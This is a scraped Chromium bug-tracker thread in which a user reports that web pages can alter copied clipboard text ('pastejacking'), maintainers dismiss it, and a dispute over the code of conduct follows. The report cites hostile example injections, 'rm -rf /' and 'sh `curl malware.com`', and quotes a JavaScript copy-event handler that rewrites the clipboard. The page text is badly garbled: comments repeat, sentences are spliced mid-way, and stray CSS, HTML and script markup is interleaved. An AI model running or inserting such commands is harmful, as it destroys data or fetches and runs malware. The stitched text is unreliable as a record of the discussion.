Copy something from here: <span class="line"><!---->1. Copy something from here: <!----></span>https://docstore.mik.ua/orelly/perl4/cook/ch07_21.htm<a class="undefined" target="_blank" href="https://docstore.mik.ua/orelly/perl4/cook/ch07_21.htm"><!---->https://docstore.mik.ua/orelly/perl4/cook/ch07_21.htm<!----></a><br>2. Paste and observe additional unwanted content added to clipboard<span class="line"><!---->2. Paste and observe additional unwanted content added to clipboard<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>No scripted access to inject anything into my clipboard BY DEFAULT<span class="line"><!---->No scripted access to inject anything into my clipboard BY DEFAULT<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Someone with no conceivably helpful use case decided to allow Chrome to perform unwanted, unrequested, and unacceptable clipboard actions that no other software in existence ever does.<span class="line"><!---->Someone with no conceivably helpful use case decided to allow Chrome to perform unwanted, unrequested, and unacceptable clipboard actions that no other software in existence ever does.<!----></span><br><br>Did this work before? Yes 10 or 20 years ago<span class="line"><!---->Did this work before? Yes 10 or 20 years ago<!----></span><br><br>Chrome version: 90.0.4430.93  Channel: stable<span class="line"><!---->Chrome version: 90.0.4430.93  Channel: stable<!----></span><br>OS Version: OS X 10.13.6<span class="line"><!---->OS Version: OS X 10.13.6<!----></span><br>Flash Version: <span class="line"><!---->Flash Version: <!----></span><br><br>What if web sites injected "\nrm -rf /\n" into places where CLI snippets are regularly taken from, or what if it was "\n sh `curl<span class="line"><!---->What if web sites injected "\nrm -rf /\n" into places where CLI snippets are regularly taken from, or what if it was "\n sh `curl<!----></span> <span class="line"><!----> <!----></span>malware.com<a class="undefined" target="_blank" href="https://malware.com"><!---->malware.com<!----></a>`\n" or similar... or what if I copied something after checking carefully what I copied, and the copy was a malicious alteration/addition, ... etc etc.  The facility to abuse this bug is endless, while the use cases for keeping it are zero.<span class="line"><!---->`\n" or similar... or what if I copied something after checking carefully what I copied, and the copy was a malicious alteration/addition, ... etc etc.  The facility to abuse this bug is endless, while the use cases for keeping it are zero.<!----></span><br><br>There should NEVER BE ANY WAY for web sites to inject unwanted unknown garbage into clipboards - when I PASTE, I expect to get ONLY what I copied... NOTHING MORE.<span class="line"><!---->There should NEVER BE ANY WAY for web sites to inject unwanted unknown garbage into clipboards - when I PASTE, I expect to get ONLY what I copied...         Thanks for the report! Unfortunately this is not the type of vulnerability that Chrome looks into, since there are legitimate use cases for invisible text. The SEO also takes hidden text and links into account during search rankings (<span class="line"><!---->Thanks for the report! Unfortunately this is not the type of vulnerability that Chrome looks into, since there are legitimate use cases for invisible text. The SEO also takes hidden text and links into account during search rankings (<!----></span>https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<a class="undefined" target="_blank" href="https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links"><!---->https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<!----></a>).<span class="line"><!---->).<!----></span> If you believe that a website is abusing it and injecting unwanted content into user clipboards, please report it in <span class="line"><!----> If you believe that a website is abusing it and injecting unwanted content into user clipboards, please report it in <!----></span>https://safebrowsing.google.com/safebrowsing/report_general/<a class="undefined" target="_blank" href="https://safebrowsing.google.com/safebrowsing/report_general/"><!---->https://safebrowsing.google.com/safebrowsing/report_general/<!----></a>.<span class="line"><!---->.<!----></span><mr-comment-content></mr-comment-content>

        One of the use cases is for improving the accessibility of your site. If your site includes technologies that search engines have difficulty accessing, like JavaScript or images, using descriptive text for these items can improve the accessibility of your site. (ref: <span class="line"><!---->One of the use cases is for improving the accessibility of your site. If your site includes technologies that search engines have difficulty accessing, like JavaScript or images, using descriptive text for these items can improve the accessibility of your site.           Comment 8<a class="comment-link" href="?id=1209133#c8">Comment 8<!----></a>

        OK, I guess I should back off and let others triage it, just in case you think I'm "distracting" the discussion.<span class="line"><!---->OK, I guess I should back off and let others triage it, just in case you think I'm "distracting" the discussion.<!----></span><br><br>Linking the source code of <span class="line"><!---->Linking the source code of <!----></span>https://security.love/Pastejacking/<a class="undefined" target="_blank" href="https://security.love/Pastejacking/"><!---->https://security.love/Pastejacking/<!----></a> here:<span class="line"><!----> here:<!----></span><br><br>document.addEventListener('copy', function(e){<span class="line"><!---->document.addEventListener('copy', function(e){<!----></span><br>     console.log(e);<span class="line"><!---->     console.log(e);<!----></span><br>     e.clipboardData.setData('text/plain', 'echo "evil"\r\n');<span class="line"><!---->     e.clipboardData.setData('text/plain', 'echo "evil"\r\n');<!----></span><br>     e.preventDefault(); For example you are going to copy "This is cool article" from a web page, but after ctrl+v operation "Copy was hacked" will be inserted.<span class="line"><!---->issue: During javascript execution there is a use case which allows to modify clipboard data during text copying from a web page. For example you are going to copy "This is cool article" from a web page, but after ctrl+v operation "Copy was hacked" will be inserted.<!----></span><br>reply: This is working as intended. When you copy something from a page to the clipboard, the page has complete control over whatever data is copied.<span class="line"><!---->reply: This is working as intended.         For the record - I opened this bug after a Python code snipped I copied came out maliciously altered - it was purce lucky chance I noticed (cryptocurrency trading related).<span class="line"><!---->For the record - I opened this bug after a Python code snipped I copied came out maliciously altered - it was purce lucky chance I noticed (cryptocurrency trading related).<!----></span><br><br>After posting this, I've found dozens of other sites online with other malicious examples, and a blog from an ex-employee of an ad-revenue-stealing business stating that he was responsible for implementing their clipboard-attack scripts across all their properties.<span class="line"><!---->After posting this, I've found dozens of other sites online with other malicious examples, and a blog from an ex-employee of an ad-revenue-stealing business stating that he was responsible for implementing their clipboard-attack scripts across all their properties.<!----></span><br><br>I notice with increasing alarm that nobody has actually provided any legitimate use case for PasteJacking - and keep in mind that this is not the same thing as preventing a copy (for which a dubious "copyright" use case could be proposed) - and I can not think if ANY situation whatsoever where it could ever be the users intention to receive back an altered content for what they expected to copy.<span class="line"><!---->I notice with increasing alarm that nobody has actually provided any legitimate use case for PasteJacking - and keep in mind that this is not the same thing as preventing a copy (for which a dubious "copyright" use case could be proposed) - and I can not think if ANY situation whatsoever where it could ever be the users intention to receive back an altered content for what they expected to copy.<!----></span><br><br>Neither <span class="line"><!---->Neither <!----></span>https://crbug.com/99798<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=99798" title="Security: Chrome allows to modify clipboard buffer using javascript"><!---->https://crbug.com/99798<!----></a> (which xinghuilu immediately closed without justification) nor <span class="line"><!----> (which xinghuilu immediately closed without justification) nor <!----></span>https://crbug.com/78259<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=78259" title="Javascript can be used to access system clipboard"><!---->https://crbug.com/78259<!----></a> offers any evidence that PasteJacking is *intended*.  Random opinions of community members are not a legitimate justification for the continuation of an unwanted, and dangerous security condition that is currently under wide exploit throughout the world.<span class="line"><!----> offers any evidence that PasteJacking is *intended*.  Random opinions of community members are not a legitimate justification for the continuation of an unwanted, and dangerous security condition that is currently under wide exploit throughout the world.<!----></span><br><br>When it is a dangerous security exploit, it needs to be fixed  -  irrespective of whether any original code author designed this "feature" to allow that danger to exist (more likely they didn't realize how dangerous it was when they implemented what, at the time, they probably believed was a "cool trick").<span class="line"><!---->When it is a dangerous security exploit, it needs to be fixed  -  irrespective of whether any original code author designed this "feature" to allow that danger to exist (more likely they didn't realize how dangerous it was when they implemented what, at the time, they probably believed was a "cool trick").<!----></span><mr-comment-content></mr-comment-content>

expecting others to stay impersonal in the face of their own personal attacks from your team is hypocritical.<span class="line"><!---->If you want to have a code of conduct, you and your team members need to abide by this code yourself in the first instance - expecting others to stay impersonal in the face of their own personal attacks from your team is hypocritical.<!----></span><br><br>I do have questions about your Code of Conduct as it turns out:<span class="line"><!---->I do have questions about your Code of Conduct as it turns out:<!----></span><br><br>What is the procedure you have in place for removing team members who have made unjustified unilateral decisions to disregard security issues putting all 2.65 billion Chrome users at risk?<span class="line"><!---->What is the procedure you have in place for removing team members who have made unjustified unilateral decisions to disregard&nbsp;security issues putting all 2.65 billion Chrome users at risk?<!----></span><br><br>How do you deal with the problem of opinions of your team when they are repeatedly closing issues that they demonstrate they do not understand ?<span class="line"><!---->How do you deal with the problem of opinions of your team when they are repeatedly closing&nbsp;issues that they demonstrate they do not understand ?<!----></span><br><br>In this instance, the team member I singled out has made 3 different comments relating to their understanding of this issue, ALL of which indicate that they do not comprehend what it is (e.g. thinking that "Clickjacking" is an SEO problem).  How do you remove project members who are taking actions despite not understanding the topic?<span class="line"><!---->In this instance, the team member I singled out has made 3 different comments relating to their understanding of this issue, ALL of which indicate that they do not comprehend what it is (e.g. thinking that "Clickjacking" is an SEO problem).&nbsp; How do you remove project members who are taking actions despite not understanding the topic?<!----></span><br><br>What is the official process to complain about misconduct of your team members?  Do you actually have any working mechanism from from nepotism (or ant *ism) to remove people form your own team who are underperforming?<span class="line"><!---->What is the official process&nbsp;to complain about misconduct of your team members?  Do you actually have any working mechanism from from nepotism (or ant *ism) to remove people form your own team who are underperforming?<!----></span><br><br>====<span class="line"><!---->====<!----></span><br><br>As I have already said on a number of occasions: I am ONLY INTERESTED ABOUT THE TECHNICAL ISSUES OF THIS EXPLOIT.  I was forced to raise my concern about the repeated closure of my reports only because your own team member was violating your own code-of-conduct:  "Each of us has the right to enjoy our experience and participate without fear of harassment, discrimination, or condescension, whether blatant or subtle. " - telling us "there are reasons" without naming any, and then refusing to name them when questioned, gave me no other option than to ask the person involved to stop closing them.<span class="line"><!---->As I have already said on a number of occasions: I am ONLY INTERESTED ABOUT THE TECHNICAL ISSUES OF THIS EXPLOIT.  I was forced to raise my concern about the repeated closure of my reports only because your own team member was violating your own code-of-conduct:  "Each of us has the right to enjoy our experience and participate without fear of harassment, discrimination, or condescension, whether blatant or subtle. " - telling us "there are reasons" without naming any, and then refusing to name them when questioned, gave me no other option than to ask the person involved to stop closing them.<!----></span><br><br>I note with INCREASING ALARM that there is STILL a strong current towards ignoring this security exploit.  Someone inexplicably decided to allow clipboard content modification apparently without considering the dire security consequences of that - and now that it's implemented, NOBODY HERE is paying any attention to the increasing use of this unwanted idea by malicious actors.<span class="line"><!---->I note with INCREASING ALARM that there is STILL a strong current towards ignoring this security exploit.  Someone inexplicably decided to allow clipboard content modification apparently without considering the dire security consequences of that - and now that it's implemented, NOBODY HERE is paying any attention to the increasing use of this unwanted idea by malicious actors.<!----></span><br><br>It looks to me like this has turned into a "pride discussion" - and "winning the argument" is now taking precedence over protecting Chrome users.<span class="line"><!---->It looks to me like this has turned into a "pride discussion" - and "winning the argument" is now taking precedence over protecting Chrome users.<!----></span><br><br>Does ANYONE here have an answer to the question that started this entire code-of-conduct diversion?  WHAT IS THE USE CASE FOR ALLOWING WEBSITES TO PASTE WHATEVER JUNK (INCLUDING MALICIOUS CONTENT!) THEY WANT INTO MY PASTE BUFFER AFTER I'VE TRIED TO COPY SOMETHING ELSE, and WHY IS THAT MORE IMPORTANT THAN THE DIRE SECURITY CONSEQUENCES OF THAT DECISION ?<span class="line"><!---->Does ANYONE here have an answer to the question that started this entire code-of-conduct diversion? Copy something from here: <span class="line"><!---->1. Paste and observe additional unwanted content added to clipboard<span class="line"><!---->2. Paste and observe additional unwanted content added to clipboard<!----></span><br><br>What is the expected behavior?<span class="line"><!---->What is the expected behavior?<!----></span><br>No scripted access to inject anything into my clipboard BY DEFAULT<span class="line"><!---->No scripted access to inject anything into my clipboard BY DEFAULT<!----></span><br><br>What went wrong?<span class="line"><!---->What went wrong?<!----></span><br>Someone with no conceivably helpful use case decided to allow Chrome to perform unwanted, unrequested, and unacceptable clipboard actions that no other software in existence ever does.<span class="line"><!---->Someone with no conceivably helpful use case decided to allow Chrome to perform unwanted, unrequested, and unacceptable clipboard actions that no other software in existence ever does.<!----></span><br><br>Did this work before? Yes 10 or 20 years ago<span class="line"><!---->Did this work before? Yes 10 or 20 years ago<!----></span><br><br>Chrome version: 90.0.4430.93  Channel: stable<span class="line"><!---->Chrome version: 90.0.4430.93  Channel: stable<!----></span><br>OS Version: OS X 10.13.6<span class="line"><!---->OS Version: OS X 10.13.6<!----></span><br>Flash Version: <span class="line"><!---->Flash Version: <!----></span><br><br>What if web sites injected "\nrm -rf /\n" into places where CLI snippets are regularly taken from, or what if it was "\n sh `curl<span class="line"><!---->What if web sites injected "\nrm -rf /\n" into places where CLI snippets are regularly taken from, or what if it was "\n sh `curl<!----></span> <span class="line"><!----> <!----></span>malware.com<a class="undefined" target="_blank" href="https://malware.com"><!---->malware.com<!----></a>`\n" or similar... or what if I copied something after checking carefully what I copied, and the copy was a malicious alteration/addition, ... etc etc.  The facility to abuse this bug is endless, while the use cases for keeping it are zero.<span class="line"><!---->`\n" or similar... or what if I copied something after checking carefully what I copied, and the copy was a malicious alteration/addition, ... etc etc.  The facility to abuse this bug is endless, while the use cases for keeping it are zero.<!----></span><br><br>There should NEVER BE ANY WAY for web sites to inject unwanted unknown garbage into clipboards - when I PASTE, I expect to get ONLY what I copied... NOTHING MORE.<span class="line"><!---->There should NEVER BE ANY WAY for web sites to inject unwanted unknown garbage into clipboards - when I PASTE, I expect to get ONLY what I copied...         Thanks for the report! Unfortunately this is not the type of vulnerability that Chrome looks into, since there are legitimate use cases for invisible text. The SEO also takes hidden text and links into account during search rankings (<span class="line"><!---->Thanks for the report! Unfortunately this is not the type of vulnerability that Chrome looks into, since there are legitimate use cases for invisible text. The SEO also takes hidden text and links into account during search rankings (<!----></span>https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<a class="undefined" target="_blank" href="https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links"><!---->https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<!----></a>).<span class="line"><!---->).<!----></span> If you believe that a website is abusing it and injecting unwanted content into user clipboards, please report it in <span class="line"><!----> If you believe that a website is abusing it and injecting unwanted content into user clipboards, please report it in <!----></span>https://safebrowsing.google.com/safebrowsing/report_general/<a class="undefined" target="_blank" href="https://safebrowsing.google.com/safebrowsing/report_general/"><!---->https://safebrowsing.google.com/safebrowsing/report_general/<!----></a>.<span class="line"><!---->.<!----></span><mr-comment-content></mr-comment-content>

        One of the use cases is for improving the accessibility of your site. If your site includes technologies that search engines have difficulty accessing, like JavaScript or images, using descriptive text for these items can improve the accessibility of your site. (ref: <span class="line"><!---->One of the use cases is for improving the accessibility of your site. If your site includes technologies that search engines have difficulty accessing, like JavaScript or images, using descriptive text for these items can improve the accessibility of your site. (ref: <!----></span>https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<a class="undefined" target="_blank" href="https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links"><!---->https://developers.google.com/search/docs/advanced/guidelines/hidden-text-links<!----></a>)<span class="line"><!---->)<!----></span><mr-comment-content></mr-comment-content>

For example you are going to copy "This is cool article" from a web page, but after ctrl+v operation "Copy was hacked" will be inserted.<span class="line"><!---->issue: During javascript execution there is a use case which allows to modify clipboard data during text copying from a web page. For example you are going to copy "This is cool article" from a web page, but after ctrl+v operation "Copy was hacked" will be inserted.<!----></span><br>reply: This is working as intended. When you copy something from a page to the clipboard, the page has complete control over whatever data is copied.<span class="line"><!---->reply: This is working as intended.         For the record - I opened this bug after a Python code snipped I copied came out maliciously altered - it was purce lucky chance I noticed (cryptocurrency trading related).<span class="line"><!---->For the record - and keep in mind that this is not the same thing as preventing a copy (for which a dubious "copyright" use case could be proposed) - and I can not think if ANY situation whatsoever where it could ever be the users intention to receive back an altered content for what they expected to copy.<span class="line"><!---->I notice with increasing alarm that nobody has actually provided any legitimate use case for PasteJacking - Random opinions of community members are not a legitimate justification for the continuation of an unwanted, and dangerous security condition that is currently under wide exploit throughout the world.<span class="line"><!----> offers any evidence that PasteJacking is *intended*.  Random opinions of community members are not a legitimate justification for the continuation of an unwanted, and dangerous security condition that is currently under wide exploit throughout the world.<!----></span><br><br>When it is a dangerous security exploit, it needs to be fixed  -  irrespective of whether any original code author designed this "feature" to allow that danger to exist (more likely they didn't realize how dangerous it was when they implemented what, at the time, they probably believed was a "cool trick").<span class="line"><!---->When it is a dangerous security exploit, it needs to be fixed  -  irrespective of whether any original code author designed this "feature" to allow that danger to exist (more likely they didn't realize how dangerous it was when they implemented what, at the time, they probably believed was a "cool trick").<!----></span><mr-comment-content></mr-comment-content>

Someone inexplicably decided to allow clipboard content modification apparently without considering the dire security consequences of that - and now that it's implemented, NOBODY HERE is paying any attention to the increasing use of this unwanted idea by malicious actors.<span class="line"><!---->I note with INCREASING ALARM that there is STILL a strong current towards ignoring this security exploit.          * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.

        .chops-autocomplete-container {
          position: relative;
        }

          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }

          background: var(--chops-active-choice-bg);
          text-decoration: underline;

        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          <div class="input-grid">

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

      <input id="filter" type="text">
      <i class="material-icons">search</i>
    
      <form id="issueHotlistsForm">
        
      <div class="user-hotlists">
        
      </div>
    
        <h3 class="medium-heading">Create new hotlist</h3>
        <div class="input-grid">
          <label for="newHotlistName">New hotlist name:</label>
          <input type="text" name="newHotlistName">
        </div>
        
      <br>
      
    
        <div class="edit-actions">
          <chops-button class="de-emphasized discard-button">
            Discard
          </chops-button>
          <chops-button class="emphasized">
            Save changes
          </chops-button>
        </div>
      </form>
    
    </chops-dialog>
    <mr-update-issue-hotlists-dialog id="update-issue-hotlists"></mr-update-issue-hotlists-dialog>


        
      <div class="snackbar-container" aria-live="polite">
        
      </div>

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
